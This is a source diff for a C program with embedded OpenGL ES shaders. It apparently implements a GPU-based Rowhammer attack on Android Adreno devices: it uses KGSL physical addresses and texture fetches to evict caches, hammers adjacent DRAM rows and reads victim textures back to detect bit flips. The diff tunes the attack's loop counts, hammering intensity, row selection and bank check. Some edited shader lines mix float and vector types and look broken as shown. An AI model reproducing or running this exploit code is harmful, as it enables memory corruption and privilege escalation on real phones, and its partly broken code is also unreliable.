@@ -185,41 +185,41 @@ const char *hammeringShaderSource = "#version 300 es\n"
 	"uniform sampler2D evict10;\n" //  has size of 64 regular pages, needed to evict caches
 	"uniform sampler2D evict11;\n" //  has size of 64 regular pages, needed to evict caches
 	"uniform sampler2D evict12;\n" //  has size of 64 regular pages, needed to evict caches
-	"out vec4 val;\n"
+	"out float val;\n"
 	"void main(){\n"
 	"	//int id = int(threadD.x) % 4;\n"
 	"	for(uint i = 0u; i < 1000000u; i++){\n"
 	"		\n"
-	"		val += texelFetch(row1, ivec2( 0, 0), 0); \n "
-	"		 val += texelFetch(row2, ivec2(0,0), 0) ;\n"
+	"		val += texelFetch(row1, ivec2( 0, 0), 0).r; \n "
+	"		 val += texelFetch(row2, ivec2(0,0), 0).r ;\n"
 	
-	"		 val += texelFetch(evict1, ivec2(0, 0), 0) ;\n "
-	"		 val += texelFetch(evict7, ivec2(0, 0), 0) ;\n "
-	"		 val += texelFetch(evict2, ivec2(0, 0), 0) ;\n "
-//	"		 val += texelFetch(evict8, ivec2(0, 0), 0) ;\n "
-	"		 val += texelFetch(evict3, ivec2(0, 0), 0) ;\n "
-//	"		 val += texelFetch(evict9, ivec2(0, 0), 0) ;\n "
-	"		 val += texelFetch(evict4, ivec2(0, 0), 0) ;\n "
+	"		 val += texelFetch(evict1, ivec2(0, 0), 0).r ;\n "
+	"		 val += texelFetch(evict7, ivec2(0, 0), 0).r ;\n "
+	"		 val += texelFetch(evict2, ivec2(0, 0), 0).r ;\n "
+	"		 val += texelFetch(evict8, ivec2(0, 0), 0) ;\n "
+	"		 val += texelFetch(evict3, ivec2(0, 0), 0).r ;\n "
+	"		 val += texelFetch(evict9, ivec2(0, 0), 0) ;\n "
+	"		 val += texelFetch(evict4, ivec2(0, 0), 0).r ;\n "
 //	"		 val += texelFetch(evict10, ivec2(0, 0), 0) ;\n "
-	"		 val += texelFetch(evict5, ivec2(0, 0), 0) ;\n "
+//	"		 val += texelFetch(evict5, ivec2(0, 0), 0).r ;\n "
 //	"		 val += texelFetch(evict11, ivec2(0, 0), 0) ;\n "
-	"		 val += texelFetch(evict6, ivec2(0, 0), 0) ;\n "
+//	"		 val += texelFetch(evict6, ivec2(0, 0), 0).r ;\n "
 //	"		 val += texelFetch(evict12, ivec2(0, 0), 0) ;\n "
 	
-	"		 val += texelFetch(row1, ivec2(0, 2), 0) ;\n "
-	"		 val += texelFetch(row2, ivec2(0, 2), 0) ;\n "
+	"		 val += texelFetch(row1, ivec2(0, 2), 0).r ;\n "
+	"		 val += texelFetch(row2, ivec2(0, 2), 0).r ;\n "
 
-	"		 val += texelFetch(evict1, ivec2(0, 2), 0) ;\n "
-	"		 val += texelFetch(evict7, ivec2(0, 2), 0) ;\n "
-	"		 val += texelFetch(evict2, ivec2(0, 2), 0) ;\n "
-//	"		 val += texelFetch(evict8, ivec2(0, 2), 0) ;\n "
-	"		 val += texelFetch(evict3, ivec2(0, 2), 0) ;\n "
-//	"		 val += texelFetch(evict9, ivec2(0, 2), 0) ;\n "
-	"		 val += texelFetch(evict4, ivec2(0, 2), 0) ;\n "
+	"		 val += texelFetch(evict1, ivec2(0, 2), 0).r ;\n "
+	"		 val += texelFetch(evict7, ivec2(0, 2), 0).r ;\n "
+	"		 val += texelFetch(evict2, ivec2(0, 2), 0).r ;\n "
+	"		 val += texelFetch(evict8, ivec2(0, 2), 0) ;\n "
+	"		 val += texelFetch(evict3, ivec2(0, 2), 0).r ;\n "
+	"		 val += texelFetch(evict9, ivec2(0, 2), 0) ;\n "
+	"		 val += texelFetch(evict4, ivec2(0, 2), 0).r ;\n "
 //	"		 val += texelFetch(evict10, ivec2(0, 2), 0); \n"
-	"		 val += texelFetch(evict5, ivec2(0, 2), 0); \n"
+//	"		 val += texelFetch(evict5, ivec2(0, 2), 0).r; \n"
 //	"		 val += texelFetch(evict11, ivec2(0, 2), 0); \n"
-	"		 val += texelFetch(evict6, ivec2(0, 2), 0); \n"
+//	"		 val += texelFetch(evict6, ivec2(0, 2), 0).r; \n"
 //	"		 val += texelFetch(evict12, ivec2(0, 2), 0); \n"
 
 	"	}\n"
@@ -235,10 +235,10 @@ const char *hammeringVertexShaderSource = "#version 300 es\n"
 
 
 const char *hammeringFragmetShaderSource = "#version 300 es\n"
-	"in vec4 val;\n"
+	"in float val;\n"
 	"out vec4 FragColor;\n"
 	"void main(){\n"
-	"	FragColor = val;\n"
+	"	FragColor = vec4(val, 0.f, 0.f, 1.f);\n"
 	"}\n";
 
 void egl_setup() {
@@ -570,7 +570,7 @@ int main(){
 	glDeleteShader(fragmentShader);
 	glDeleteShader(vertexShader);
 	int bitflips = 0;
-	for(size_t i = 0; i < cont_kgsls; ++i){
+	for(size_t i = 14; i < cont_kgsls; ++i){
 		// preparing program to run
 		struct kgsl_entry* evictarr[15];
 		struct kgsl_entry* row1 = kgsl_result[i];
@@ -602,7 +602,7 @@ int main(){
 		}
 
  
-		for( int k = 0; k < 32; k += 2){
+		for( int k = 0; k < 28; k += 1){
 			// Hammering two rows...
 			GLuint group[2];
 			GLuint counter[3];
@@ -616,7 +616,7 @@ int main(){
 			unsigned int* frame2  = (unsigned int*)malloc(sizeof(unsigned int) * 32 * 32);
 			memset(frame2, 0x00, 32 * 32 * sizeof(unsigned int));
 			
-			if(((uint64_t)row1->kgsl_pa >> 13 && 0x7) != ((uint64_t)row1->kgsl_next->kgsl_pa >> 13 && 0x7))	goto next_iter;
+			if(((uint64_t)row1->kgsl_pa >> 13 & 0x7) != ((uint64_t)row1->kgsl_next->kgsl_pa >> 13 & 0x7))	goto next_iter;
 			glClearColor(0.0f, 0.0f, 0.0f, 0.0f);
 			glClear(GL_COLOR_BUFFER_BIT);
 			glUseProgram(shaderProgram2);
@@ -728,7 +728,7 @@ int main(){
 			printf("Trying to hammer chunk %d : %d\n", i, k);
 			
 			row1TexLocation = glGetUniformLocation(shaderProgram2, "border");;
-			glUniform1i(row1TexLocation, 1000000);			
+			glUniform1i(row1TexLocation, 1300000);			
 			// running the program
 			getCounterByName("VBIF", "AXI_READ_REQUESTS_TOTAL", &group[0],&counter[0]);
     			getCounterByName("TP", "TPL1_TPPERF_TP0_L1_REQUESTS", &group[1],&counter[1]);
@@ -778,7 +778,7 @@ int main(){
 			}
         	printf("\n");
 					glBindFramebuffer(GL_FRAMEBUFFER, FBF);	
-		for(int vic = 0; vic < 2; ++vic){	
+		for(int vic = 0; vic < 4; ++vic){	
 			glFramebufferTexture2D(GL_FRAMEBUFFER, GL_COLOR_ATTACHMENT0, GL_TEXTURE_2D, victim->kgsl_id, 0);
 			glReadPixels(0, 0, 32, 32, GL_RGBA,GL_UNSIGNED_BYTE, frame2);
 			printf("READVALS: \n");
@@ -792,15 +792,15 @@ int main(){
 			}
 			victim = victim->kgsl_next;
 		}
-			glBindFramebuffer(GL_FRAMEBUFFER, 0);
-			//glFramebufferTexture2D(GL_FRAMEBUFFER, GL_COLOR_ATTACHMENT0, GL_TEXTURE_2D, 0, 0); 
+			//glBindFramebuffer(GL_FRAMEBUFFER, 0);
+			glFramebufferTexture2D(GL_FRAMEBUFFER, GL_COLOR_ATTACHMENT0, GL_TEXTURE_2D, tex, 0); 
 			//memset(frame2, 0xaa, 32 * 32 * sizeof(unsigned int));
 			//glReadPixels(0, 0, 32, 32, GL_RGBA,GL_UNSIGNED_BYTE, frame2);
 			//for(int i = 0; i < 32 * 32; ++i) if(frame2[i] != 0xff000000)printf("FRAMEBUFFER: 0x%x - [%d:%d]\n", frame2[i],  i % 32, i / 32);
 			
 	next_iter:
 			free(frame2);
-			row1 = row1->kgsl_next->kgsl_next;
+			row1 = row1->kgsl_next;
 			victim = row1;
 			for(int j = 0; j < 16; ++j){
 				victim = victim->kgsl_next;
@@ -811,7 +811,7 @@ int main(){
 
 			row2 = victim;
 			for(int j = 0; j < 16; ++j){
-				if(k == 16){
+				if(j < 5){
 					glBindTexture(GL_TEXTURE_2D, row2->kgsl_id);
 					glTexSubImage2D(GL_TEXTURE_2D, 0, 0, 0, 32, 32, GL_RGBA, GL_UNSIGNED_BYTE, textures_data);
 				}
